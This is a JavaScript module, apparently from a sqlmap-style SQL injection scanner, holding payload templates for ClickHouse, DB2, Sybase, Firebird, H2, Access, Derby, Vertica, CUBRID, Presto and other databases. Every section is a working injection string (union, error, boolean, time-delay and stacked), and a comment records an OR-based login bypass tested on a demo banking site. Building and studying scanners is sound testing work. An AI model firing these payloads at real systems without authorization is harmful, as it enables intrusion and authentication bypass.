// 其余 10 个 DBMS payload 模板（从 payloads.js 拆分）
// ClickHouse / DB2 / Sybase / Firebird / Informix / H2 / Access / HSQLDB / Derby / MonetDB
// 占位符：{ORIG}=原始值 {SLEEP}=延迟秒数 {NUM}=随机整数 {SEP}=注释符

// ClickHouse：列式分析型数据库，自有 SQL 方言（非标准 SLEEP / 用 if() 构造布尔/时间）。
// 仅提供检测 payload（union/error/boolean/time），利用/提取路径标注受限（见 Exploiter/Extractor 映射）。
export const clickhousePayload = {
  union: [
    "{ORIG} UNION ALL SELECT {NUM},version()-- -",
    "{ORIG}' UNION ALL SELECT {NUM},version()-- -",
    '{ORIG}" UNION ALL SELECT {NUM},version()-- -',
  ],
  error: [
    // ClickHouse 报错向量：强制类型转换失败触发 "Cannot parse" / "DB::Exception"
    "{ORIG}' AND cast((SELECT version()),'UInt64')=1-- -",
    "{ORIG}\" AND cast((SELECT version()),'UInt64')=1-- -",
    "{ORIG}' AND 1=CAST((SELECT version()) AS UInt64)-- -",
  ],
  boolean: [
    "{ORIG}' AND '1'='1",
    '{ORIG}" AND "1"="1',
    "{ORIG}' AND '1'='2",
    '{ORIG}" AND "1"="2',
    "{ORIG} AND 1=1",
    "{ORIG} AND 1=2",
    // [6,7] OR-based 布尔变体（对标 sqlmap risk>=2 的 OR 边界，BooleanBlindDetector 在 risk>=2 时投放）
    "{ORIG}' OR '1'='1",
    "{ORIG}' OR '1'='2",
  ],
  time: [
    // ClickHouse 无原生 SLEEP；用 sleep() 函数（单位为秒，命名与 PG 类似但非标准）近似延迟
    "{ORIG}' AND sleep({SLEEP})=0-- -",
    '{ORIG}" AND sleep({SLEEP})=0-- -',
    "{ORIG}'; SELECT sleep({SLEEP})-- -",
  ],
  // ClickHouse 不支持堆叠查询（每次仅单语句），留空不投放
  stacked: [],
};

// —— C 方向新增（最小适配：union/error/boolean 基础；time/stacked 仅 Sybase 支持）——
// 方言 payload 未经真实环境验证，标注待验证。
export const db2Payload = {
  union: [
    "{ORIG} UNION SELECT {NUM},'DB2' FROM SYSIBM.SYSDUMMY1-- -",
    "{ORIG}' UNION SELECT {NUM},'DB2' FROM SYSIBM.SYSDUMMY1-- -",
    "{ORIG}\" UNION SELECT {NUM},'DB2' FROM SYSIBM.SYSDUMMY1-- -",
  ],
  error: [
    "{ORIG}' AND 1=CAST((SELECT 'a' FROM SYSIBM.SYSDUMMY1) AS INTEGER)-- -",
    "{ORIG}\" AND 1=CAST((SELECT 'a' FROM SYSIBM.SYSDUMMY1) AS INTEGER)-- -",
    "{ORIG}' AND db2_sqli_probe_nonexist_func()=1-- -",
  ],
  boolean: [
    "{ORIG}' AND '1'='1",
    '{ORIG}" AND "1"="1',
    "{ORIG}' AND '1'='2",
    '{ORIG}" AND "1"="2',
    "{ORIG} AND 1=1",
    "{ORIG} AND 1=2",
    // [6,7] OR-based 布尔变体（对标 sqlmap risk>=2 的 OR 边界，BooleanBlindDetector 在 risk>=2 时投放）
    "{ORIG}' OR '1'='1",
    "{ORIG}' OR '1'='2",
  ],
  time: [],
  stacked: [],
};

export const sybasePayload = {
  union: [
    "{ORIG} UNION SELECT {NUM},@@version-- -",
    "{ORIG}' UNION SELECT {NUM},@@version-- -",
    '{ORIG}" UNION SELECT {NUM},@@version-- -',
  ],
  error: [
    "{ORIG}' AND 1=CONVERT(int,(SELECT @@version))-- -",
    '{ORIG}" AND 1=CONVERT(int,(SELECT @@version))-- -',
    "{ORIG}' AND 1=CAST((SELECT @@version) AS int)-- -",
  ],
  boolean: [
    "{ORIG}' AND '1'='1",
    '{ORIG}" AND "1"="1',
    "{ORIG}' AND '1'='2",
    '{ORIG}" AND "1"="2',
    "{ORIG} AND 1=1",
    "{ORIG} AND 1=2",
    // [6,7] OR-based 布尔变体（对标 sqlmap risk>=2 的 OR 边界，BooleanBlindDetector 在 risk>=2 时投放）
    "{ORIG}' OR '1'='1",
    "{ORIG}' OR '1'='2",
  ],
  time: [
    "{ORIG}'; WAITFOR DELAY '0:0:{SLEEP}'-- -",
    '{ORIG}"; WAITFOR DELAY "0:0:{SLEEP}"-- -',
    "{ORIG}' WAITFOR DELAY '0:0:{SLEEP}'-- -",
  ],
  stacked: [
    "{ORIG}; WAITFOR DELAY '0:0:{SLEEP}' {SEP}",
    "{ORIG}'; WAITFOR DELAY '0:0:{SLEEP}' {SEP}",
    '{ORIG}"; WAITFOR DELAY "0:0:{SLEEP}" {SEP}',
  ],
};

export const firebirdPayload = {
  union: [
    "{ORIG} UNION SELECT {NUM},rdb$get_context('SYSTEM','ENGINE_VERSION') FROM RDB$DATABASE-- -",
    "{ORIG}' UNION SELECT {NUM},rdb$get_context('SYSTEM','ENGINE_VERSION') FROM RDB$DATABASE-- -",
    "{ORIG}\" UNION SELECT {NUM},rdb$get_context('SYSTEM','ENGINE_VERSION') FROM RDB$DATABASE-- -",
  ],
  error: [
    "{ORIG}' AND 1=CAST((SELECT 'a' FROM RDB$DATABASE) AS INTEGER)-- -",
    "{ORIG}\" AND 1=CAST((SELECT 'a' FROM RDB$DATABASE) AS INTEGER)-- -",
    "{ORIG}' AND firebird_sqli_probe_nonexist_func()=1-- -",
  ],
  boolean: [
    "{ORIG}' AND '1'='1",
    '{ORIG}" AND "1"="1',
    "{ORIG}' AND '1'='2",
    '{ORIG}" AND "1"="2',
    "{ORIG} AND 1=1",
    "{ORIG} AND 1=2",
    // [6,7] OR-based 布尔变体（对标 sqlmap risk>=2 的 OR 边界，BooleanBlindDetector 在 risk>=2 时投放）
    "{ORIG}' OR '1'='1",
    "{ORIG}' OR '1'='2",
  ],
  time: [],
  stacked: [],
};

export const informixPayload = {
  union: [
    "{ORIG} UNION SELECT {NUM},DBINFO('version','full') FROM systables WHERE tabid=1-- -",
    "{ORIG}' UNION SELECT {NUM},DBINFO('version','full') FROM systables WHERE tabid=1-- -",
    "{ORIG}\" UNION SELECT {NUM},DBINFO('version','full') FROM systables WHERE tabid=1-- -",
  ],
  error: [
    "{ORIG}' AND 1=CAST((SELECT 'a' FROM systables WHERE tabid=1) AS INTEGER)-- -",
    "{ORIG}\" AND 1=CAST((SELECT 'a' FROM systables WHERE tabid=1) AS INTEGER)-- -",
    "{ORIG}' AND informix_sqli_probe_nonexist_func()=1-- -",
  ],
  boolean: [
    "{ORIG}' AND '1'='1",
    '{ORIG}" AND "1"="1',
    "{ORIG}' AND '1'='2",
    '{ORIG}" AND "1"="2',
    "{ORIG} AND 1=1",
    "{ORIG} AND 1=2",
    // [6,7] OR-based 布尔变体（对标 sqlmap risk>=2 的 OR 边界，BooleanBlindDetector 在 risk>=2 时投放）
    "{ORIG}' OR '1'='1",
    "{ORIG}' OR '1'='2",
  ],
  time: [],
  stacked: [],
};

export const h2Payload = {
  union: [
    "{ORIG} UNION SELECT {NUM},version()-- -",
    "{ORIG}' UNION SELECT {NUM},version()-- -",
    '{ORIG}" UNION SELECT {NUM},version()-- -',
  ],
  error: [
    "{ORIG}' AND 1=CAST((SELECT 'a') AS INT)-- -",
    "{ORIG}\" AND 1=CAST((SELECT 'a') AS INT)-- -",
    "{ORIG}' AND h2_sqli_probe_nonexist_func()=1-- -",
  ],
  boolean: [
    "{ORIG}' AND '1'='1",
    '{ORIG}" AND "1"="1',
    "{ORIG}' AND '1'='2",
    '{ORIG}" AND "1"="2',
    "{ORIG} AND 1=1",
    "{ORIG} AND 1=2",
    // [6,7] OR-based 布尔变体（对标 sqlmap risk>=2 的 OR 边界，BooleanBlindDetector 在 risk>=2 时投放）
    "{ORIG}' OR '1'='1",
    "{ORIG}' OR '1'='2",
  ],
  // [P1] H2 内建 SLEEP(ms) 函数（单位毫秒，{SLEEP}000 将秒→毫秒），返回 0
  time: [
    "{ORIG}' AND SLEEP({SLEEP}000)=0-- -",
    '{ORIG}" AND SLEEP({SLEEP}000)=0-- -',
    "{ORIG}' AND (CASE WHEN 1=1 THEN SLEEP({SLEEP}000) ELSE 0 END)=0-- -",
  ],
  stacked: [],
};

// —— D 方向新增（最小适配：union/error/boolean 基础；time/stacked 均不支持）——
// 方言 payload 未经真实环境验证，标注待验证。
// Access（Jet SQL）：Using MSysObjects as pseudo-table
// 注意：Access 无原生 version() 函数，用常量串 'ACCESS' 回显标识
// 注意：Access 不支持 error-based 注入，error 留空
// 注意：Access 无原生 SLEEP 函数，time 留空
// 注意：Access 不支持堆叠查询，stacked 留空
// HSQLDB（HyperSQL）：Using (VALUES(0)) t as pseudo-table
// Derby（Apache Derby）：Using SYSIBM.SYSDUMMY1 as pseudo-table
// MonetDB（Column-store）：Using sys.version as pseudo-table
export const accessPayload = {
  union: [
    "{ORIG} UNION SELECT {NUM},1,1 FROM MSysObjects-- -",
    "{ORIG}' UNION SELECT {NUM},1,1 FROM MSysObjects-- -",
    '{ORIG}" UNION SELECT {NUM},1,1 FROM MSysObjects-- -',
  ],
  error: [],
  boolean: [
    "{ORIG}' AND '1'='1",
    '{ORIG}" AND "1"="1',
    "{ORIG}' AND '1'='2",
    '{ORIG}" AND "1"="2',
    "{ORIG} AND 1=1",
    "{ORIG} AND 1=2",
    // [6,7] OR-based 布尔变体（对标 sqlmap risk>=2 的 OR 边界，BooleanBlindDetector 在 risk>=2 时投放）
    "{ORIG}' OR '1'='1",
    "{ORIG}' OR '1'='2",
  ],
  time: [],
  stacked: [],
};

export const hsqldbPayload = {
  union: [
    "{ORIG} UNION SELECT {NUM},'HSQLDB' FROM (VALUES(0)) t-- -",
    "{ORIG}' UNION SELECT {NUM},'HSQLDB' FROM (VALUES(0)) t-- -",
    "{ORIG}\" UNION SELECT {NUM},'HSQLDB' FROM (VALUES(0)) t-- -",
  ],
  error: [
    "{ORIG}' AND 1=CAST((SELECT 'a' FROM (VALUES(0)) t) AS INTEGER)-- -",
    "{ORIG}\" AND 1=CAST((SELECT 'a' FROM (VALUES(0)) t) AS INTEGER)-- -",
    "{ORIG}' AND hsqldb_sqli_probe_nonexist_func()=1-- -",
  ],
  boolean: [
    "{ORIG}' AND '1'='1",
    '{ORIG}" AND "1"="1',
    "{ORIG}' AND '1'='2",
    '{ORIG}" AND "1"="2',
    "{ORIG} AND 1=1",
    "{ORIG} AND 1=2",
    // [6,7] OR-based 布尔变体（对标 sqlmap risk>=2 的 OR 边界，BooleanBlindDetector 在 risk>=2 时投放）
    "{ORIG}' OR '1'='1",
    "{ORIG}' OR '1'='2",
  ],
  time: [],
  stacked: [],
};

export const derbyPayload = {
  union: [
    "{ORIG} UNION SELECT {NUM},'DERBY' FROM SYSIBM.SYSDUMMY1-- -",
    "{ORIG}' UNION SELECT {NUM},'DERBY' FROM SYSIBM.SYSDUMMY1-- -",
    "{ORIG}\" UNION SELECT {NUM},'DERBY' FROM SYSIBM.SYSDUMMY1-- -",
  ],
  error: [],
  boolean: [
    "{ORIG}' AND '1'='1",
    '{ORIG}" AND "1"="1',
    "{ORIG}' AND '1'='2",
    '{ORIG}" AND "1"="2',
    "{ORIG} AND 1=1",
    "{ORIG} AND 1=2",
    // [6,7] OR-based 布尔变体（对标 sqlmap risk>=2 的 OR 边界，BooleanBlindDetector 在 risk>=2 时投放）
    // [D209] 补注释后缀。Derby 的典型查询是 `WHERE uid='…' AND passw='…'`，SQL 里 AND 优先于 OR，
    // 不带 `-- -` 时 `… OR '1'='1' AND passw='…'` 恒假 ⇒ 真/假两组都落空 ⇒ 空基线兜底对（ti:7/fi:6）
    // 静默失效。实测 demo.testfire.net 的 POST /doLogin（testuser 不是有效用户）：
    //   `testuser' OR '1'='1`       → login.jsp（失败）
    //   `testuser' OR '1'='1'-- -`  → bank/main.jsp（成功）
    // ⚠ 其他库（MySQL/PG/Oracle…）的同类模板也缺注释后缀，但各自 SQL 上下文不同，
    // 须逐个靶场验证后再改，不在这一批盲改。
    "{ORIG}' OR '1'='1'-- -",
    "{ORIG}' OR '1'='2'-- -",
  ],
  time: [],
  stacked: [],
};

export const monetdbPayload = {
  union: [
    "{ORIG} UNION SELECT {NUM},(SELECT sys_version FROM sys.version) FROM sys.version-- -",
    "{ORIG}' UNION SELECT {NUM},(SELECT sys_version FROM sys.version) FROM sys.version-- -",
    '{ORIG}" UNION SELECT {NUM},(SELECT sys_version FROM sys.version) FROM sys.version-- -',
  ],
  error: [
    "{ORIG}' AND 1=CAST((SELECT 'a' FROM sys.version) AS INTEGER)-- -",
    "{ORIG}\" AND 1=CAST((SELECT 'a' FROM sys.version) AS INTEGER)-- -",
    "{ORIG}' AND monetdb_sqli_probe_nonexist_func()=1-- -",
  ],
  boolean: [
    "{ORIG}' AND '1'='1",
    '{ORIG}" AND "1"="1',
    "{ORIG}' AND '1'='2",
    '{ORIG}" AND "1"="2',
    "{ORIG} AND 1=1",
    "{ORIG} AND 1=2",
    // [6,7] OR-based 布尔变体（对标 sqlmap risk>=2 的 OR 边界，BooleanBlindDetector 在 risk>=2 时投放）
    "{ORIG}' OR '1'='1",
    "{ORIG}' OR '1'='2",
  ],
  // [P1] MonetDB 内建 sys.sleep(sec) 函数（单位秒），返回 NULL/整数值因版本而异
  time: [
    "{ORIG}' AND (CASE WHEN 1=1 THEN sys.sleep({SLEEP}) ELSE 0 END) IS NOT NULL-- -",
    '{ORIG}" AND (CASE WHEN 1=1 THEN sys.sleep({SLEEP}) ELSE 0 END) IS NOT NULL-- -',
    "{ORIG}'; SELECT sys.sleep({SLEEP})-- -",
  ],
  stacked: [],
};

// ==================== D307：sqlmap 官方测试集暴露的 4 方言 ====================
// 依据：sqlmap 1.10.11 data/xml/payloads/*.xml 共 18 条 <test> 的官方语法
// （SAP MaxDB 10 / Vertica 2 / CUBRID 4 / Presto 2）。模板逐条映射官方 payload，
// 占位符换成本仓 {ORIG}/{SLEEP}/{NUM}/{SEP}。
// ⚠ 诚实边界：本机无这 4 种数据库，模板为静态移植、未经真机验证（与 others.js
//   既有「最小适配待验证」同口径）。指纹层 resolveDbms 把 maxdb/cubrid/vertica
//   归一到 MySQL/PG（兼容映射，不动）——这些独立 key 只在用户 --dbms 显式指定时命中
//   （detect.js forcedDbms 原样流入 PAYLOADS[dbms]，不经归一），自动指纹场景不投放。
// boolean 数组遵循固定索引契约：[0,2] 单引号真假 / [1,3] 双引号 / [4,5] 数字型 / [6,7] OR。

// SAP MaxDB：sqlmap 官方用 CASE WHEN ... FROM DUAL（WHERE/ORDER BY 值位）与
// ;SELECT CASE WHEN ... FROM DUAL（stacked）；time 通道官方走 heavy query 大笛卡尔积
// （DOMAIN.DOMAINS × COLUMNS × TABLES），本仓 TimeBlindDetector 依赖可观测 {SLEEP} 延时，
// heavy query 无稳定延时阈值 ⇒ time 留空不投放（不伪造延时向量）。
export const sapMaxdbPayload = {
  union: [
    "{ORIG} UNION SELECT {NUM},* FROM DUAL-- -",
    "{ORIG}' UNION SELECT {NUM},* FROM DUAL-- -",
    '{ORIG}" UNION SELECT {NUM},* FROM DUAL-- -',
  ],
  error: [
    "{ORIG}' AND 1=CAST((SELECT 'a' FROM DUAL) AS INTEGER)-- -",
    '{ORIG}" AND 1=CAST((SELECT \'a\' FROM DUAL) AS INTEGER)-- -',
  ],
  boolean: [
    // [0]/[2] 单引号真假对（官方 ORDER BY CASE WHEN 形态，加注释适配 WHERE 值位）
    "{ORIG}' AND (CASE WHEN 1=1 THEN 1 ELSE NULL END)=1-- -",
    "{ORIG}' AND (CASE WHEN 1=2 THEN 1 ELSE NULL END)=1-- -",
    // [1]/[3] 双引号对
    '{ORIG}" AND (CASE WHEN 1=1 THEN 1 ELSE NULL END)=1-- -',
    '{ORIG}" AND (CASE WHEN 1=2 THEN 1 ELSE NULL END)=1-- -',
    // [4]/[5] 数字型无引号对
    "{ORIG} AND (CASE WHEN 1=1 THEN 1 ELSE NULL END)=1-- -",
    "{ORIG} AND (CASE WHEN 1=2 THEN 1 ELSE NULL END)=1-- -",
    // [6]/[7] OR 变体（对标官方 OR time/boolean）
    "{ORIG}' OR (CASE WHEN 1=1 THEN 1 ELSE NULL END)=1-- -",
    "{ORIG}' OR (CASE WHEN 1=2 THEN 1 ELSE NULL END)=1-- -",
  ],
  // 官方 stacked：;SELECT CASE WHEN <cond> THEN 1 ELSE NULL END FROM DUAL
  stacked: [
    "{ORIG}';SELECT CASE WHEN 1=1 THEN 1 ELSE NULL END FROM DUAL-- -",
    "{ORIG}';SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3-- -",
  ],
  // 官方 5 条 time 均为 heavy query（无稳定延时）⇒ 留空，不伪造 SLEEP 向量
  time: [],
};

// Vertica：官方 2 条 error-based = ZEROIFNULL(CAST('marker'||(query)::varchar||'marker' AS NUMERIC))
export const verticaPayload = {
  union: [
    "{ORIG} UNION SELECT {NUM},version()-- -",
    "{ORIG}' UNION SELECT {NUM},version()-- -",
    '{ORIG}" UNION SELECT {NUM},version()-- -',
  ],
  error: [
    "{ORIG}' AND {NUM}=ZEROIFNULL(CAST('~'||(SELECT CASE WHEN ({NUM}={NUM}) THEN BITCOUNT(BITSTRING_TO_BINARY('1')) ELSE BITCOUNT(BITSTRING_TO_BINARY('0')) END)::varchar||'~' AS NUMERIC))-- -",
    "{ORIG} OR {NUM}=ZEROIFNULL(CAST('~'||(SELECT CASE WHEN ({NUM}={NUM}) THEN BITCOUNT(BITSTRING_TO_BINARY('1')) ELSE BITCOUNT(BITSTRING_TO_BINARY('0')) END)::varchar||'~' AS NUMERIC))-- -",
  ],
  boolean: [
    "{ORIG}' AND 1=1-- -",
    '{ORIG}" AND "1"="1-- -',
    "{ORIG}' AND 1=2-- -",
    '{ORIG}" AND "1"="2-- -',
    "{ORIG} AND 1=1-- -",
    "{ORIG} AND 1=2-- -",
    "{ORIG}' OR 1=1-- -",
    "{ORIG}' OR 1=2-- -",
  ],
  stacked: [],
  time: [], // 官方无 Vertica time-based 测试
};

// CUBRID：官方 2 条 error = INET_ATON('marker'||(query)||'marker')，
// 2 条 time = (SELECT SLEEP(n) FROM db_root)
export const cubridPayload = {
  union: [
    "{ORIG} UNION SELECT {NUM},version()-- -",
    "{ORIG}' UNION SELECT {NUM},version()-- -",
    '{ORIG}" UNION SELECT {NUM},version()-- -',
  ],
  error: [
    "{ORIG}' AND {NUM}=INET_ATON('~'||(SELECT CASE WHEN ({NUM}={NUM}) THEN 1 ELSE 0 END)||'~')-- -",
    "{ORIG} OR {NUM}=INET_ATON('~'||(SELECT CASE WHEN ({NUM}={NUM}) THEN 1 ELSE 0 END)||'~')-- -",
  ],
  boolean: [
    "{ORIG}' AND 1=1-- -",
    '{ORIG}" AND "1"="1-- -',
    "{ORIG}' AND 1=2-- -",
    '{ORIG}" AND "1"="2-- -',
    "{ORIG} AND 1=1-- -",
    "{ORIG} AND 1=2-- -",
    "{ORIG}' OR 1=1-- -",
    "{ORIG}' OR 1=2-- -",
  ],
  time: [
    "{ORIG}' AND {NUM}=(SELECT SLEEP({SLEEP}) FROM db_root)-- -",
    "{ORIG} OR {NUM}=(SELECT SLEEP({SLEEP}) FROM db_root)-- -",
  ],
  stacked: [],
};

// Presto：官方 2 条 error = PARSE_DATA_SIZE('marker'||CAST((query) AS VARCHAR)||'marker')
export const prestoPayload = {
  union: [
    "{ORIG} UNION SELECT {NUM},current_user-- -",
    "{ORIG}' UNION SELECT {NUM},current_user-- -",
    '{ORIG}" UNION SELECT {NUM},current_user-- -',
  ],
  error: [
    "{ORIG}' AND {NUM}=PARSE_DATA_SIZE('~'||CAST((SELECT CASE WHEN ({NUM}={NUM}) THEN 1 ELSE 0 END) AS VARCHAR)||'~')-- -",
    "{ORIG} OR {NUM}=PARSE_DATA_SIZE('~'||CAST((SELECT CASE WHEN ({NUM}={NUM}) THEN 1 ELSE 0 END) AS VARCHAR)||'~')-- -",
  ],
  boolean: [
    "{ORIG}' AND 1=1-- -",
    '{ORIG}" AND "1"="1-- -',
    "{ORIG}' AND 1=2-- -",
    '{ORIG}" AND "1"="2-- -',
    "{ORIG} AND 1=1-- -",
    "{ORIG} AND 1=2-- -",
    "{ORIG}' OR 1=1-- -",
    "{ORIG}' OR 1=2-- -",
  ],
  stacked: [],
  time: [], // 官方无 Presto time-based 测试
};
